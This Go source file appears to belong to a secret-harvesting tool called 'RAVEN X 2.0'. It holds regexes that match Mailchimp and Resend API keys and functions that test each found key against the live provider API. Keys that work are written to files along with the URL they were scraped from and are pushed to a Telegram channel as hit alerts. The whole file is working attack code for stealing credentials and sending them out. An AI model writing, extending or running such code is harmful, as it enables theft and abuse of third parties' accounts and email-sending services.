package main

import (
	"fmt"
	"net/http"
	"regexp"
	"strings"
	"time"
)

// ── Wave-9: Extended email providers — Mailchimp and Resend ──────────────────

// Mailchimp API keys always end with -us<N> (datacenter suffix).
// Both a standalone pattern and a context-based pattern are compiled here.
var (
	mailchimpAPIKeyPattern        = regexp.MustCompile(`[a-f0-9]{32}-us[0-9]{1,2}`)
	mailchimpContextAPIKeyPattern = regexp.MustCompile(`(?i)(?:mailchimp[_-]?(?:api[_-]?)?key|MC_API_KEY)\s*[:=]\s*["']?([a-f0-9]{32}-us[0-9]+)["']?`)

	resendAPIKeyPattern = regexp.MustCompile(`re_[A-Za-z0-9_-]{24,40}`)
)

// ── CheckMailchimp ────────────────────────────────────────────────────────────
//
// Extracts the datacenter from the key suffix (e.g. "-us12" → "us12") and
// calls the corresponding regional API endpoint. A 200 with `account_id` in
// the body confirms the key is live.
func (a *AWSScanner) CheckMailchimp(key, sourceURL string) bool {
	if !a.Config.APIValidation.Mailchimp {
		return false
	}
	if _, loaded := a.KnownKeys.LoadOrStore(key, true); loaded {
		return false
	}

	// Extract datacenter from key suffix ("-us1" … "-us99")
	dcPat := regexp.MustCompile(`-us([0-9]{1,2})$`)
	dcMatch := dcPat.FindStringSubmatch(key)
	if dcMatch == nil {
		return false
	}
	dc := "us" + dcMatch[1]

	apiURL := fmt.Sprintf("https://%s.api.mailchimp.com/3.0/", dc)
	req, err := http.NewRequest("GET", apiURL, nil)
	if err != nil {
		return false
	}
	req.Header.Set("Authorization", "Bearer "+key)

	c := &http.Client{Timeout: 12 * time.Second}
	resp, err := c.Do(req)
	if err != nil || resp == nil {
		return false
	}
	defer resp.Body.Close()

	buf := make([]byte, 4096)
	n, _ := resp.Body.Read(buf)
	body := string(buf[:n])

	if resp.StatusCode == 200 && strings.Contains(body, "account_id") {
		a.logValid("Mailchimp", fmt.Sprintf("Key: %s dc=%s", key, dc))
		a.saveIntoFile(fmt.Sprintf("%s:%s", sanitizeSource(sourceURL), key), "valid_mailchimp.txt")
		a.storeValidKeyLimit("Mailchimp", key, "Active")

		globalCounters.mu.Lock()
		globalCounters.APIsValidated++
		globalCounters.mu.Unlock()

		msg := fmt.Sprintf(`🔥 <b>RAVEN X 2.0 RESULT</b>
━━━━━━━━━━━━━━━━━━
📧 <b>MAILCHIMP API KEY LIVE</b>

🔑 <b>Key:</b> <code>%s</code>
🌐 <b>DC:</b> %s
🔗 <b>Source:</b> %s
`, key, dc, sourceURL)
		go a.sendTelegram(msg)
		return true
	}
	return false
}

// ── CheckResend ───────────────────────────────────────────────────────────────

func (a *AWSScanner) CheckResend(key, sourceURL string) bool {
	if !a.Config.APIValidation.Resend {
		return false
	}
	if _, loaded := a.KnownKeys.LoadOrStore(key, true); loaded {
		return false
	}

	req, err := http.NewRequest("GET", "https://api.resend.com/domains", nil)
	if err != nil {
		return false
	}
	req.Header.Set("Authorization", "Bearer "+key)

	c := &http.Client{Timeout: 12 * time.Second}
	resp, err := c.Do(req)
	if err != nil || resp == nil {
		return false
	}
	defer resp.Body.Close()

	if resp.StatusCode == 200 {
		a.logValid("Resend", fmt.Sprintf("Key: %s", key))
		a.saveIntoFile(fmt.Sprintf("%s:%s", sanitizeSource(sourceURL), key), "valid_resend.txt")
		a.storeValidKeyLimit("Resend", key, "Active")

		globalCounters.mu.Lock()
		globalCounters.APIsValidated++
		globalCounters.mu.Unlock()

		msg := fmt.Sprintf(`🔥 <b>RAVEN X 2.0 RESULT</b>
━━━━━━━━━━━━━━━━━━
📧 <b>RESEND API KEY LIVE</b>

🔑 <b>Key:</b> <code>%s</code>
🔗 <b>Source:</b> %s
`, key, sourceURL)
		go a.sendTelegram(msg)
		return true
	}
	return false
}
